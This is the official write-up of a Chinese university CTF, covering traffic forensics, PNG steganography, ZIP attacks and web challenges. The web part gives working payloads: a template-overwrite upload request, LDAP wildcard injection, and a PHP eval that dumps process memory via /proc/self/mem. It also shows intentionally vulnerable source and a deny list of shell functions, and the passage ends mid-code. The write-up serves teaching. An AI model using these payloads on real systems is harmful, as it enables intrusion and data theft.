<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>第一届大连东软信息学院“东软杯”网络安全CTF竞赛-官方WriteUp</p>
<p>为贯彻落实习近平总书记关于网络安全和信息化工作的一系列重要指示精神，延揽储备网信领域优秀人才，提升国家网络空间安全能力，加快攻防兼备创新人才培养步伐，进一步提升大学生的网络空间安全创新能力与实践能力，实现以赛促学、以赛促教、以赛促用。 <strong>大连东软信息学院“东软杯”网络安全CTF竞赛 由大连市公安局作为指导单位、大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持</strong>。</p>
<p><strong> 出题战队:大连东软信息学院网络安全工作室</strong><br/>
<strong>特约出题人: Processor</strong></p>
<h1 data-content="1" id="6357bb034692b72562daff7a891cdc40">MISC</h1>
<h3 data-content="1" id="6ccb9fac60380240562ebb3a17ac914b">1 签到</h3>
<p>难度 签到<br/>
复制给出的flag输入即可</p>
<h3 data-content="1" id="93c6dbcd8ba80251962af0f2ee1c48b6">2 range_download</h3>
<p>难度 中等<br/>
flag{6095B134-5437-4B21-BE52-EDC46A276297}</p>
<h4 data-content="1" id="2a5117231d28652c155ee91c30f92e91">0x01</h4>
<p>分析dns流量，发现dns &amp;&amp; ip.addr=1.1.1.1存在dns隧道数据，整理后得到base64:<br/>
cGFzc3dvcmQ6IG5zc195eWRzIQ==<br/>
解base64得到:<br/>
password: nss_yyds!</p>
<h4 data-content="1" id="fbf09f060ca3cfd265e5eaaeaae6d444">0x02</h4>
<p>分析http流量，发现ip.addr==172.21.249.233存在http分段下载数据，每次按照请求头range要求只下载一个字节。由于是random下载，所以需要按顺序整理，整理后可以得到一个加密的压缩包。<br/>
在整理过程中会发现缺失2349位字节，需要尝试对其进行修复。<br/>
由于0x01中，我们得到了zip的密码，所以可以对该字节进行爆破，如果密码正确，则修复成功。</p>
<h4 data-content="1" id="f29244916f02d53da413e3a0194e76f6">0x03</h4>
<p>解开压缩包得到二维码，<br/>
扫描后得到:</p>
<pre><code>5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d</code></pre>
<p>ciphey分析得到flag：</p>
<pre><code>ciphey "5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d" Possible plaintext: '5133687161454e534e6b394d4d325a7854475233566e6870626a42554e6a5a4a5645466c4e47786 a62324e464d47705557464635546d6c536148565165564659645563774e327073515863324f5846555247314555564134555 570706344686957444d336544684c596c4255556e6333636e687165486c756446413351577470566e4242526b6c4a5457316 c515452754d555661636e4a7859556430566c4d3559557844656a4a35626c68334d6d5a4c51513d3d' (y/N): Possible plaintext: '5133687161454v534v6y394w4w325z7854475233566v6870626z42554v6z5z4z5645466x4v47786 z62324v464w47705557464635546w6x536148565165564659645563774v327073515863324u5846555247314555564134555 570706344686957444w336544684x596x4255556v6333636v687165486x756446413351577470566v4242526y6x4z5457316 x515452754w555661636v4z7859556430566x4w3559557844656z4z35626x68334w6w5z4x51513w3w' (y/N): Possible plaintext: 'w3w31515x4z5w6w43386x62653z4z6564487559553w4x6650346559587z4v636166555w45725451 5x6137545z4x6y6252424v665074775153314644657x684561786v6363336v6555524x695x486445633w4447596864436070 755554314655554137425556485u423368515370723v477365546956465561565841635x6w64553646475550774w464v4232 6z68774v4x6645465z4z5z6v45524z6260786v6653325744587z523w4w493y6v435v4541617863315' (y/N): Possible plaintext: 'd3d31515c4a5d6d43386c62653a4a6564487559553d4c6650346559587a4e636166555d45725451 5c6137545a4c6b6252424e665074775153314644657c684561786e6363336e6555524c695c486445633d4447596864436070 755554314655554137425556485f423368515370723e477365546956465561565841635c6d64553646475550774d464e4232 6a68774e4c6645465a4a5a6e45524a6260786e6653325744587a523d4d493b6e435e4541617863315' (y/N): Possible plaintext: 'flag{6095B134-5437-4B21-BE52-EDC46A276297}' (y/N): y ╭────────────────────────────────────────────────────────────────╮
│ The plaintext is a Capture The Flag (CTF) Flag                 │ 
│ Formats used:                                                  │ 
│    hexadecimal                                                 │ 
│    base64                                                      │ 
│    utf8                                                        │ 
│    base62                                                      │
│    base58_bitcoin                                              │
│    base32                                                      │
│    utf8Plaintext: "flag{6095B134-5437-4B21-BE52-EDC46A276297}" │ ╰────────────────────────────────────────────────────────────────╯</code></pre>
<h4 data-content="1" id="80688e231f5a2eeb3a012a86e2831fd8">0x04</h4>
<p>题目流量生成脚本：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s2">"cG Fz c3 dv cm Q6 IG 5z c1 95 eW Rz IQ =="</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">):</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"nslookup "</span> <span class="o">+</span> <span class="n">i</span><span class="o">+</span><span class="s2">".nss.neusoft.edu.cn 1.1.1.1"</span><span class="p">)</span>

<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">l</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="s2">"http://172.21.249.233/flag.7z"</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Length"</span><span class="p">])</span>
<span class="n">a</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">!=</span> <span class="n">l</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"http://172.21.249.233/flag.7z"</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">"Range"</span><span class="p">:</span> <span class="s2">"bytes="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"-"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)})</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">416</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
    <span class="n">a</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</pre></div>
<h3 data-content="1" id="b74d90f6f2c9731026230d0520b3fc7c">3 只是个PNG，别想太多了.png</h3>
<p>难度 签到<br/>
flag：flag{zhe_ti_mu_ye_tai_bt_le_XD}<br/>
本题考察的是对PNG结构以及常见工具的使用。<br/>
题目只是在IDAT数据当中存储了多余的zlib数据流，通过binwalk可以直接进行解压缩。<br/>
binwalk -Me PNG.png<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122623-dce95d82-491c-1.png"/></p>
<h3 data-content="1" id="c1d89449b7a78358d931eb139087ec10">4 png被打得很惨，现在卷土从来</h3>
<p>难度 难<br/>
flag：<br/>
flag{zheshirenchude}<br/>
本题考察的是对PNG结构以及常见出题点的了解程度<br/>
打开题目是PNG图片，binwalk无异常<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122623-dd4251c6-491c-1.png"/><br/>
010editor打开发现crc异常，结构暂时没啥问题。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122624-dd6c66a0-491c-1.png"/><br/>
tweakpng打开发现，IHDR，IDAT，IEND数据块的CRC值均不对。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122624-dda05456-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122624-dddb3df0-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122625-de16bed4-491c-1.png"/><br/>
之后用StegSolve查看，发现图片有隐藏的框。框选出了IDAT data，说明IDAT数据应该有特殊之处需要查看。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122625-de2cb69e-491c-1.png"/><br/>
图片本身的信息就这么多，从PNG结构来一点点看，首先IHDR区块CRC有问题，一般说明是图片高度被修改，通过CRC反计算脚本（或者直接修改高度值盲试）发现图片下面有隐藏图像。stegSolve查看，发现有隐藏图案<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122625-de5fc05c-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122626-deb89fba-491c-1.png"/><br/>
三个框分别圈出了png图片的一些数据结构，第二个框显示png图像数据使用zlib方式压缩。框选此处说明需要注意zlib压缩数据。<br/>
第三个框是具体压缩块数据结构。此图片内容为libpng官网文档截图，但是实际访问官网，可发现标注的压缩块结构标注并不符合。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122626-defa55ae-491c-1.png"/><br/>
数字被故意修改过，所以可知2233这串数字应该为题目的某个key或者hint。<br/>
之后所有的IDAT数据块CRC值均不正确。将所有CRC值拷贝下来。hex解码。发现是hint<br/>
hint<em>is</em>[IEND_and_11]_jiayou_XD.<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122627-df254ba6-491c-1.png"/><br/>
根据hint查看IEND，正常IEND数据应为空，仅作为文件结束标志。但是现在却有数据。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122627-df66d3aa-491c-1.png"/><br/>
提取数据，发现前四位为9C 78,而zlib数据头为78 9C。修改前四位进行解压。发现是base64，之后进行解码。最后得出flag第一段<br/>
flag{zheshi<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122627-df8759e0-491c-1.png"/><br/>
得到第一段之后，hint里面的11，还没有解决。通过查看发现chunk 11，是最后一个IDAT数据块。根据之前还有一个hint 2233，全数据块搜索2233。发现数据块末尾含有2233，仅此一个<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122628-dfd6469a-491c-1.png"/><br/>
根据前一段flag，猜测此处也是zlib压缩，将从2233开头到CRC值之前的32个HEX值复制，修改2233为zlib数据头78 9C<br/>
发现解码完数据为一种编码，根据前一段flag来猜测，此处应该是其他base家族类的编码。通过basecrack或者在线base解码，可得知此为base91，解码为renchude}<br/>
后一段flag为：renchude}<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122628-dffdf276-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122628-e0390e7e-491c-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122629-e06f888c-491c-1.png"/><br/>
合并两段，得到最终flag<br/>
flag{zheshirenchude}</p>
<h3 data-content="1" id="055ff29500fa0b2fceb41748db72e7b6">5 在哪呢</h3>
<p>难度 简单<br/>
查看PDF<br/>
在文字中发现多处颜色越来越淡的提示<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122629-e0816ad4-491c-1.png"/><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122629-e0a257bc-491c-1.png"/><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122629-e0b01a78-491c-1.png"/><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122629-e0d75566-491c-1.png"/><br/>
想到flag可能被以白色隐藏到文字中，全选文字<br/>
发现倒数第二段段尾有一段空白字<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122630-e1069f7e-491c-1.png"/><br/>
复制出来或编辑为其它颜色<br/>
得到flag<br/>
flag{hey_there_is_no_thing}</p>
<h3 data-content="1" id="0ab214f37a3be7d89fff66695470ebe2">6 ecryptedzip</h3>
<p>难度:难<br/>
本题考察的是对明文攻击的实战应用 在实际环境中不会主动提供明文文件用于明文攻击 需要自己寻找明文文件或部分明文进行攻击<br/>
压缩包内含有两个文件LICENSE和README.md<br/>
LICENSE为开源证书文件<br/>
将常⻅开源协议全下载下来 对比大小<br/>
发现Apache 2.0大小极为相近<br/>
使用github 内置的LICENSE文件可以成功解密<br/>
还有一种简单的方法 开源许可证很多都是空格开头 可以直接使用多个重复空格作为明文</p>
<h3 data-content="1" id="a357f992304064989cac43db7fda3f0b">7 easysteg</h3>
<p>难度 简单<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122630-e14eceb6-491c-1.png"/><br/>
可以看到一个缺少定位符的二维码，补全后拿到提示：一种常见的隐写<br/>
分离图片拿到压缩包<br/>
解压后配合观察图片名称格式，使用stegpy拿到flag<br/>
flag{Do_U_Kn0w_Ste9py??}</p>
<h3 data-content="1" id="da43d4c7154f4048777eccefbe7db99e">8 压缩包压缩包压缩包</h3>
<p>难度 简单<br/>
第一层为50996.zip<br/>
写脚本解密递归压缩包 300层</p>
<h1 data-content="1" id="9e1a74a25af9b9de3fced5c142785a1a">解题脚本</h1>
<div class="highlight"><pre><span></span>mkdir zips
mkdir zips/files
mv <span class="m">50996</span>.zip ./zips
<span class="nb">cd</span> zips

<span class="k">while</span> :
<span class="k">do</span>  
    <span class="nv">file</span><span class="o">=</span><span class="k">$(</span>ls -t <span class="p">|</span> tail -1<span class="k">)</span>
    <span class="nv">pass</span><span class="o">=</span><span class="k">$(</span>zipinfo <span class="nv">$file</span> <span class="p">|</span> grep - <span class="p">|</span> cut -d <span class="s1">' '</span> -f12 <span class="p">|</span> cut -d . -f1<span class="k">)</span>
    unzip -P <span class="nv">$pass</span> <span class="nv">$file</span>
    <span class="nb">echo</span> <span class="s2">"unzip -P </span><span class="nv">$pass</span><span class="s2"> </span><span class="nv">$file</span><span class="s2">"</span>
    mv <span class="nv">$file</span> ./files
<span class="k">done</span>
</pre></div>
<p>最后一层为23333.zip 6位数字密码为756698<br/>
打开sqlite在employees表中找到flag<br/>
flag{Unz1p_i5_So_C00l##}</p>
<h1 data-content="1" id="930c24a12d3daefd2be0d7b893d01b29">WEB</h1>
<h3 data-content="1" id="08a61bbc364f172a1d91a25878b8a989">9 flag</h3>
<p>难度 中等</p>
<h4 data-content="1" id="c8c135e6fd3ab094a54f91922604eb3d">解法一</h4>
<p>人肉排序，然后口算base64</p>
<h4 data-content="1" id="da14860cea868b61eb2d53758f061b4d">解法二</h4>
<p>等网站输出足够多，复制下来，然后利用大部分文本编辑器都支持的<code>查找/替换</code>功能将消息替换成类似如下的格式。</p>
<div class="highlight"><pre><span></span><span class="n">a</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s2">"a"</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span>
<span class="o">...</span>
<span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s2">"a"</span>
<span class="n">a</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span><span class="o">=</span><span class="s2">"b"</span>
<span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="s2">"c"</span>
<span class="o">...</span>
<span class="c1"># 最后</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">)))</span>
</pre></div>
<h4 data-content="1" id="ad1376cf93d746a86353d6116911446e">解法三</h4>
<p>题目SSE实时推送消息至浏览器，路由为'/flag'，可以直接：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">sseclient</span> <span class="kn">import</span> <span class="n">SSEClient</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">SSEClient</span><span class="p">(</span><span class="s1">'http://127.0.0.1/flag'</span><span class="p">):</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"，"</span><span class="p">))</span>
    <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"叉(小写)"</span><span class="p">,</span> <span class="s2">"x"</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"叉(大写)"</span><span class="p">,</span> <span class="s2">"X"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="s2">""</span><span class="p">:</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s2">"?"</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<span class="p">)</span>
    <span class="k">if</span> <span class="s2">"?"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
        <span class="k">break</span>
    <span class="n">flag</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">])]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)))</span>
</pre></div>
<p>等着输出就行了</p>
<h4 data-content="1" id="5de5e5329d0e4dda71f3e73c03135730">Tips</h4>
<p>题目根据浏览器是否成功加载<a href="http://burp/favicon.ico图片来判断选手是否开启了BurpSuite。如果开启则会跳转至/Index，而正确的路由是/lndex。" target="_blank">http://burp/favicon.ico图片来判断选手是否开启了BurpSuite。如果开启则会跳转至/Index，而正确的路由是/lndex。</a><br/>
如果被检测到BurpSuite，会记录在session中，需要清空一下浏览器cookie再试。</p>
<h3 data-content="1" id="e2ddae585a42de3fc7544884e40c74f9">10 odd_upload</h3>
<p>本题考察的是新生对模板引擎的认识.<br/>
难度:中等<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122630-e17d679e-491c-1.png"/><br/>
通过页面提示.很容易发现题目使用了smarty模板引擎的demo项目<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122631-e1a9f782-491c-1.png"/><br/>
题目提供了一个上传点. 后端使用了严格的后缀黑名单防止上传php或Apache配置文件.<br/>
可通过覆盖模板文件.tpl 控制模板内容</p>
<pre><code>POST /? HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------43155698238817916993932117986
Content-Length: 365
Origin: http://
DNT: 1
Connection: close
Referer: http://
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------43155698238817916993932117986
Content-Disposition: form-data; name="file"; filename="header.tpl"
Content-Type: application/octet-stream

{phpinfo()}

-----------------------------43155698238817916993932117986
Content-Disposition: form-data; name="path"

templates/
-----------------------------43155698238817916993932117986--</code></pre>
<p>再次访问首页 之前修改的模板被渲染 执行phpinfo函数 拿到环境变量中的flag</p>
<h3 data-content="1" id="c52712f2600a7eb2141e6598588e2f5d">11 Easyinject</h3>
<p>本题考察的是Ldap注入<br/>
难度:简单<br/>
首先通过页面注释账号登陆 发现提示 flag是在目录里面的某一个用户的邮箱属性<br/>
通过关键词“目录“ “属性”可判断出题目使用了ldap 或在fuzz时页面报错也可以判断出使用了ldap<br/>
这时可以使用通配符*猜测邮箱</p>
<pre><code>L*
Ld*
Lda*</code></pre>
<p>这里注意有重叠的字符串需要额外做处理<br/>
Ps 在读提交上来的wp时发现很多同学都是先跑出用户在跑邮箱 并且猜测出了原过滤器还构造了复杂的playload. 其实可以直接跑邮箱地址不用构造用户查询.  原本设计的是跑出ldap密码的题目. 比赛前觉得难度可能有点高不适合新生. 在收集的wp中居然有大佬跑出了原先设计的ldap密码. dltql</p>
<h3 data-content="1" id="bef3693c85961175f759d8037f51b0e6">12 Hideandseek</h3>
<p>难度:难<br/>
题目提示1： 要怎样才能读到内存里面的flag呢?<br/>
题目提示2： linuxの奇妙文件系统</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
<span class="c1">//docker  </span>
<span class="c1">//FROM php:8.1.0 </span>
<span class="c1">//disable_functions=exec,shell_exec,system,passthru,popen,proc_open,putenv,getenv,pcntl_exec,fputs,fwrite,pcntl_fork,pcntl_waitpid,pcntl_setpriority,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_sigprocmask </span>
<span class="c1">//disable_classes = FFI </span>
<span class="c1">//chmod -R  0555 html/ </span>
<span class="c1">//php -S 0.0.0.0:8000 </span>

<span class="k">function</span> <span class="nf">main</span><span class="p">(){</span> 
<span class="nv">$flag</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span><span class="c1">//看到这个flag了吗 (°▽°)ノ✿ </span>
<span class="k">if</span><span class="p">(</span><span class="nv">$flag</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span> 
<span class="k">die</span><span class="p">(</span><span class="s1">'看来你失败了'</span><span class="p">);</span> 
<span class="p">}</span> 
<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">,</span><span class="s1">''</span><span class="p">);</span><span class="c1">//我把它覆盖了都不给你 （￣▽￣） </span>
<span class="nx">test</span><span class="p">();</span> 
<span class="p">}</span> 
<span class="k">function</span> <span class="nf">test</span><span class="p">(){</span> 
<span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'eval'</span><span class="p">]);</span><span class="c1">//来试试读flag吧 只有一次机会哦 执行结束flag真的会消失的说 重启容器间隔会很长时间呢 本地试好了再来试试吧 (〜￣△￣)〜  </span>
<span class="p">}</span> 
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"eval"</span><span class="p">])){</span> 
<span class="nx">main</span><span class="p">();</span> 
<span class="p">}</span> 
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>本题需要完成读取php进程内存操作<br/>
分析代码: 读取flag文件赋给$flag局部变量,目标是读取这个$flag变量的内容<br/>
但是走到test函数时不能读到其他函数的局部变量<br/>
只能通过读取内存获得flag.<br/>
这时可利用linux虚拟文件系统的特性读取内存<br/>
读取 /proc/self/maps 获取 进程自身内存布局<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122631-e1eff3b8-491c-1.png"/><br/>
使用获取到的布局信息读取自身内存<br/>
/proc/self/mem (需要给出正确的偏移量才能成功读取)</p>
<div class="highlight"><pre><span></span><span class="x">?eval=$maps = file_get_contents('/proc/self/maps');$handle=fopen('/proc/self/mem','r');$r=explode(PHP_EOL,$maps);var_dump(explode('-',$r[7])[0]);fseek($handle,hexdec(explode('-',$r[7])[0]));echo fread($handle,10000000);</span>
</pre></div>
<p>在dump出的内存寻找flag{字符串 即可获得flag</p>
<h3 data-content="1" id="db7f1ca522bd146aed9b125e152ebc70">13 dirtyrce</h3>
<p>难度:难</p>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">nodeCmd</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-cmd'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span>
    <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span>
<span class="p">})).</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="kd">function</span> <span class="nx">isValidIP</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="sr">/^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$/</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/ping"</span><span class="p">,</span>
<span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>

    <span class="nx">b</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">cmd</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ping</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'invalid parm'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">ping</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ping</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">ping</span><span class="p">.</span><span class="nx">time</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">time</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">ping</span><span class="p">.</span><span class="nx">time</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">time</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="o">||</span> <span class="nx">time</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'invalid time'</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">ping</span><span class="p">).</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
